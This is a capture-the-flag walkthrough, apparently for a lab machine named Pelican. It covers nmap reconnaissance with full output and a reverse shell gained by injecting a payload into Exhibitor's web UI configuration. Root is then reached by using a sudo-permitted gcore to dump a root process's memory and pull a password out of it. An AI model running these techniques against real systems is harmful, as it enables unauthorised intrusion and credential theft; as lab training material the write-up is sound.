First start with nmap scan.

`nmap -p- --min-rate 1000 -oN fulltcp.txt -v -Pn <IP>`

```
# Nmap 7.93 scan initiated Sun Jan  8 09:13:00 2023 as: nmap -p- --min-rate 1000 -oN fulltcp.txt -v -Pn 192.168.186.98
Increasing send delay for 192.168.186.98 from 10 to 20 due to 159 out of 528 dropped probes since last increase.
Warning: 192.168.186.98 giving up on port because retransmission cap hit (10).
Increasing send delay for 192.168.186.98 from 640 to 1000 due to 118 out of 391 dropped probes since last increase.
Nmap scan report for 192.168.186.98
Host is up (0.13s latency).
Not shown: 65508 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh    
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
631/tcp   open     ipp    
2181/tcp  open     eforward
2222/tcp  open     EtherNetIP-1
8080/tcp  open     http-proxy
8081/tcp  open     blackice-icecap
36233/tcp open     unknown

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sun Jan  8 09:14:48 2023 -- 1 IP address (1 host up) scanned in 108.18 seconds
```

Now we know what ports are open, let run nmap default scripts to know what services are running on those ports.

`nmap -sC -sV -oN normal.tcp -p 22,139,445,631,2181,2222,8080,8081,36233 -Pn <IP>`

```
# Nmap 7.93 scan initiated Sun Jan  8 09:32:24 2023 as: nmap -sC -sV -oN normal.tcp -p 22,139,445,631,2181,2222,8080,8081,36233 -Pn 192.168.186.98
Nmap scan report for 192.168.186.98                                                
Host is up (0.35s latency).           
                                         
PORT      STATE  SERVICE     VERSION
22/tcp    open   ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:                                                                                                                                                        
|   2048 a8e16068bef58e707054b427ee9a7e7f (RSA)
|   256 bb999a453f350bb349e6cf1149878d94 (ECDSA)
|_  256 f2ebfc45d7e9807766a39353de00579c (ED25519)                    
139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open   netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp   open   ipp         CUPS 2.2
|_http-server-header: CUPS/2.2 IPP/2.1  
|_http-title: Forbidden - CUPS v2.2.10
| http-methods:                       
|_  Potentially risky methods: PUT
2181/tcp  open   zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open   ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:       
|   2048 a8e16068bef58e707054b427ee9a7e7f (RSA)
|   256 bb999a453f350bb349e6cf1149878d94 (ECDSA)
|_  256 f2ebfc45d7e9807766a39353de00579c (ED25519)
8080/tcp  open   http        Jetty 1.0                                             
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(1.0)
8081/tcp  open   http        nginx 1.14.2 
|_http-title: Did not follow redirect to http://192.168.186.98:8080/exhibitor/v1/ui/index.html
|_http-server-header: nginx/1.14.2
36233/tcp closed unknown
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:                                                                                                                                                  
| smb-os-discovery:                                                                                                                                                   
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: pelican                                                         
|   NetBIOS computer name: PELICAN\x00
|   Domain name: \x00
|   FQDN: pelican
|_  System time: 2023-01-08T03:32:40-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-01-08T08:32:41
|_  start_date: N/A
|_clock-skew: mean: 1h39m59s, deviation: 2h53m13s, median: 0s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan  8 09:32:59 2023 -- 1 IP address (1 host up) scanned in 35.44 seconds
```

Now we know what services are running, started by checking port 8081 (http).

![image](https://user-images.githubusercontent.com/87468669/211188740-aaabcf9f-13c1-4070-9559-bc0816e9752f.png)

Checking port 8081 redirected me to 8080, and as we can see it is running exhibitor web ui v1.0, let's check for exploit.

![image](https://user-images.githubusercontent.com/87468669/211188859-dc3ee008-f720-45c1-aec1-0b2f5ccbabe7.png)

found an exploit on searchsploit. let's implement what the exploits does.

![image](https://user-images.githubusercontent.com/87468669/211189069-02c6d646-cd02-4076-915a-135dc147c568.png)

turn on editing, inject a reverse shell payload, fire up netcat listener and click on commit.

![image](https://user-images.githubusercontent.com/87468669/211189220-e722e7f1-9534-43c0-93e6-eef7b2774c24.png)

click on commit all at once , it will save and check back ncat listener.

![image](https://user-images.githubusercontent.com/87468669/211189253-fb525919-fb8b-46d2-9b86-0d2d2e42647b.png)

Bull's eye we got a reverse shell. stabilize the shell and let's escalate privs.

```
charles@pelican:/opt/zookeeper$ sudo -l
Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
charles@pelican:/opt/zookeeper$
```

first i checked for sudo permissions using command `sudo -l` i found out that user charles is allow to run `/usr/bin/gcore` as root without password. doing some researching about escalating privs with gcore.
gcore can be used to generate core dumps of running processes. Such files often contains sensitive information such as open files content, cryptographic keys, passwords, etc. This command produces a binary file named core.$PID, that is then often filtered with strings to narrow down relevant information.

![image](https://user-images.githubusercontent.com/87468669/211189536-82f899c5-cf23-4f89-8274-99f7eeda38b6.png)

using th command `ps -aux | grep root` to show process running as root, in the process id PID 492: we can see the process that root is running `/usr/bin/password-store`. now let use gcore to dump the process core.

```
charles@pelican:/opt/zookeeper$ sudo /usr/bin/gcore 492
0x00007f12bb31f6f4 in __GI___nanosleep (requested_time=requested_time@entry=0x7fffb07c5dc0, remaining=remaining@entry=0x7fffb07c5dc0) at ../sysdeps/unix/sysv/linux/nanosleep.c:28
28      ../sysdeps/unix/sysv/linux/nanosleep.c: No such file or directory.
Saved corefile core.492
[Inferior 1 (process 492) detached]
charles@pelican:/opt/zookeeper$ ls -al core.492
-rw-r--r-- 1 charles charles 354448 Jan  8 04:46 core.492
charles@pelican:/opt/zookeeper$ 
```

now we dumped the process into a core file save as core.492, let's use strings to make the file a human readable format.

![image](https://user-images.githubusercontent.com/87468669/211189871-f5f6bb34-fdb8-42a2-bbc0-e01dbdc95133.png)

using strings to make the core.492 file readable, i saw `001 Password: root:` which might be a potential root password. let's try it out cause no harm in trying.🤓

![image](https://user-images.githubusercontent.com/87468669/211189998-87726800-94d0-482a-8783-faa65043dba7.png)

And Boom!!! we got root... An intrsting box yeah😉
